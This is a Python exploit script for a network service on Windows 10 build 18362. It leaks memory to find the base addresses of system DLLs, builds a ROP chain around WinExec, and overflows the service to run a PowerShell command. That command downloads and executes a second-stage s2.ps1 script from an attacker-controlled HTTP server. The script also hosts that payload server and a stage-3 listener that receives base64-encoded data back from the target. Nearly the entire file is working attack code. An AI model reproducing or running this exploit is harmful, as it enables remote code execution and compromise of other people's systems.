# -*- coding: utf-8 -*-

import os
import sys
import SocketServer
import socket
import time
import sys
import struct
import threading

print (
       "### ###   #      ### ###\r\n"
       "# # # #  ### ### #   # \r\n"
       "### ####  #  # # ##  ##\r\n"
       "# # #  #  #  ### #   # \r\n"
       "nonsense...................\r\n"
       "__________________________________________________\r\n"
       "[!]. Microsoft Windows 10 Enterprise Evaluation\r\n"
       "[!]. Version : 1903 10.0.18362 N/A Build 18362\r\n"   
       ". .. z zzZZ zz zz zz z ....\r\n"                          
      )
    
sData = ''
nSocket = None
sBaseOfKernel = ''
strs = []
addresses = []
leak_size = 1035  #+ 1

class __s3hnd( SocketServer.BaseRequestHandler ) :

      def handle( self ) :
          data = self.request.recv( 1024 ).split("\r\n")
          print '[+]. (Stage 3) got connection from : '+self.client_address[0]+':'+str(self.client_address[1])
          b64_data = data[0][5:]
          b64_data = b64_data[:-9]
          print '[!]. Data (unicode) : '+str( b64_data.decode("base64") )
          print 'The End'
          print '...'
          os._exit( 0 )

class __s2hnd( SocketServer.BaseRequestHandler ) :

               HEADERS = ( "HTTP/1.1 200 OK\r\n"
                           "Server: Apache\r\n"
                           "Content-Type: text/html\r\n"
                           "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                           "Connection: Close\r\n" )

               def _sl_(self, l) :

                        return "Content-Length: " + str( l ) + "\r\n"

               def handle( self ) : 
        
                   sys.stdout.write("\n")
                   f = open( os.path.dirname(sys.argv[0]) + "\\s2.ps1" )  
                   r = f.read()
                   f.close()

                   a = ( self.HEADERS + self._sl_( len(r) ) + "\r\n" )    
                   a = a + r          
 
                   print '[+]. (Stage 2) got connection from : '+self.client_address[0]+':'+str(self.client_address[1])
                   print '[+]. Send '+os.path.dirname(sys.argv[0]) + "\\s2.ps1"+' to the target'
                   self.request.sendall( a )



def leak_addr( val ) : 

    nSocket.sendall( val * leak_size )
    nSocket.recv( 2048 )

def do_rce( eip_addr, rop_chain, url ) :  
    
    ROP = rop_chain 

    EIP = ''.join( struct.pack( "<I", eip_addr ) )  #"\x43\x43\x43\x43"
    CMD = "cmd /c PowerShell (New-Object System.Net.WebClient).DownloadFile('" + url + "',' C:\Users\Public\s2.ps1');Start-Process 'C:\Windows\System32\cmd.exe' '/c powershell -ExecutionPolicy Bypass -command C:\Users\Public\s2.ps1';REM"

    rce_payload = rop_chain + CMD + "\x48" * (1040 - len(CMD) - len( rop_chain ) ) + EIP + "\x42\x42\x42\x42" + "\x66" * (0x6a - 0xa) + "\x51\x51\x51\x51" + "\x91\x91\x91\x91" #1048 = CB, 1048 +0x6a = SEH

    
    PROGRESS = 0  #progress swieta rzecz lol
    LIB_CNT = 0
    CHAR_INDEX = 0 

    chars = ["[*]","[+]"]

    print 'Sending payload for Remote Code Execution'
    sys.stdout.write('[+]. ')

    while ( True ) :
           
           if ( PROGRESS > 11 ) :
                sys.stdout.write( "\r[+]. " )
                sys.stdout.flush( )
                PROGRESS = 0

           sys.stdout.write( chars[CHAR_INDEX] )
   
           PROGRESS = PROGRESS + 1
           try :
               nSocket.sendall( rce_payload )
               nSocket.recv( 2048 )

               time.sleep( 0.250 )

               nSocket.sendall( rce_payload )
               nSocket.recv( 2048 )
           except Exception as e :
                  break;
 
           if ( CHAR_INDEX == 0 ) :
                 CHAR_INDEX = 1
           else :
                 CHAR_INDEX = 0

    #sys.stdout.write("\n")
    #print '[+]. We should be in stage 2 ;]'
    
def sconnect( ap ) :

    sox = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    print '[!]. Connecting to server '
    sox.connect( ap )
    d = sox.recv( 2048 )
    return sox

def leak( ) :

    PROGRESS = 0
    LIB_CNT = 0
    CHAR_INDEX = 0 

    print '[+]. Sending payload for memory leak'

    sys.stdout.write('[+]. ')

    while ( True ) :

            chars = ["[*]","[+]"]

            lib_off =  [  "\x04","\x30" ] 

            if ( PROGRESS > 11 ) :
                 sys.stdout.write( "\r[+]. " )
                 sys.stdout.flush( )
                 PROGRESS = 0

            sys.stdout.write( chars[CHAR_INDEX] )
            time.sleep( 0.250 )
            PROGRESS = PROGRESS + 1

            leak_addr( lib_off[LIB_CNT] )

            nSocket.sendall( 'anypass' ) 

            sData = nSocket.recv( 2048 )

            if ( ( lib_off[LIB_CNT] * leak_size ) in sData ) :
                   continue 
  
            if ( LIB_CNT > 0 ) :
                 if ( strs[0] in sData ) :
                      continue

            try :
                 sData.decode( 'ascii' )
            except :

                    strs.append( sData )
                    LIB_CNT = LIB_CNT + 1
                    if ( LIB_CNT == 2 ) :
                         break
 
            if ( CHAR_INDEX == 0 ) :
                 CHAR_INDEX = 1
            else :
                 CHAR_INDEX = 0

    sys.stdout.write("\n")
          
def dump_mem( istr ) :

    i = 0
    istr = istr[::-1]
    while i < len(istr) :
          addresses.append(istr[i:i + 4].encode("hex"))
          print 'addr: 0x'+istr[i:i + 4].encode("hex")+' '
          i = i + 4


def to_base( mem_addr, off ) :

    int_addr = struct.unpack(">I",mem_addr.decode('hex'))[0]
    int_addr = int_addr - off
    return int_addr

#nSocket = sconnect( ('192.168.78.114', 4445) )  
nSocket = sconnect( ('192.168.1.114', 4445) )  #domowy virtualbox

leak()
      
print '[*]. Memory dump (part 1)' 
dump_mem(strs[0][:-2])
print '[*]. Memory dump (part 2)' 
dump_mem(strs[1][:-2])
print '[*]. Get base address of Advapi32.dll'
advapi32 = to_base( addresses[0], (0x32CD0 + 0x1000) ) 
print '[*]. Advapi32.dll : ' + str( hex(advapi32) )
print '------------------------------'
print '[*]. Get base address of Kernel32.dll'
kernel32 = to_base( addresses[4], 0x23EB0 )
print '[*]. Kernel32.dll : ' + str( hex(kernel32) )
print '------------------------------'
print '[*]. Get base address of Ntdll.dll'
ntdll = to_base( addresses[25], (0x34ff0 + 0x1000) )
print '[*]. Ntdll.dll : ' + str( hex(ntdll) )
winexecaddr = kernel32 + 0x5DAB0
pivot = ntdll + 0x6BF0B # add esp,0x38 | xor eax,eax | pop esi | pop ebp | retn 0xc
print '[*]. WinExec address : ' + str( hex(winexecaddr) )
print '[*]. Pivot : ' + str(hex(pivot))
print 'Run http server for stage 2'

#########
stage2 = SocketServer.TCPServer(( "0.0.0.0", 80 ), __s2hnd )
print '[*]. Server listening on 80 TCP'
if ( os.path.exists( os.path.dirname(sys.argv[0]) + "\\s2.ps1" ) ) :
     print '[*]. Payload file : ' + os.path.dirname(sys.argv[0]) + "\\s2.ps1"
else :
     print ("[!]. No payload file !\r\n"
            "     Crearate s2.ps1 in the same folder where exploit code exists\r\n")
     os._exit() 
svr_thread = threading.Thread( target = stage2.handle_request )
svr_thread.start( )
#########

print 'Building rop chain'
print '[*]. '+str(hex(advapi32 + 0x110C7))+' (POP EBX|RET)'
print '[*]. '+str(hex(kernel32 + 0x48678))+' (INC EBX|ADD AL,0x5B|RET)'
print '[*]. '+str(hex( ntdll + 0xb1604))+' (POP EBP|RET)' 
print '[*]. '+str(hex(ntdll + 0xeb871))+' (ADD EAX,ECX|POP ESI|RETN)'
print '[*]. '+str(hex(kernel32 + 0x43BC4))+' (POP EDI|RET)'
print '[*]. '+str(hex(kernel32 + 0x43BC5))+' (RET)'
print '[*]. '+str(hex(ntdll + 0x19889))+' (PUSHAD|RET)'               

rops = [
         advapi32 + 0x110C7,
         advapi32 + 0x110C7,  #pop ebx/ret
         winexecaddr,
         advapi32 + 0x110C7, #pop ebx/ret   
         0x33333333,
         0x44444444,
         0x55555555, 
         0xffffffff, #val for ebx
         kernel32 + 0x48678, #inc ebx | add al, 5b | retn 
         ntdll + 0xb1604, #pop ebp | retn 
         0x0c0c0c0c, #ebp = WinExec 
         ntdll + 0xeb871, # ADD EAX,ECX # POP ESI # RETN
         winexecaddr,
         kernel32 + 0x43BC4, #pop edi/ret
         kernel32 + 0x43BC5, #ret gadget -> edi 
         ntdll + 0x19889,  #pushad / ret  :  # PUSHAD # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
       ]
ropChain = ''.join(struct.pack('<I', _) for _ in rops)

print '[*]. Redirecting flow 2 evil data : ' + str(hex(pivot))  
do_rce( pivot, ropChain, 'http://192.168.1.36/s2.ps1' ) 
print 'Run Stage 3 Server on 8443 TCP'

stage3 = SocketServer.TCPServer(( "0.0.0.0", 8443 ), __s3hnd )
svr2_thread = threading.Thread( target = stage3.handle_request )
svr2_thread.start( )


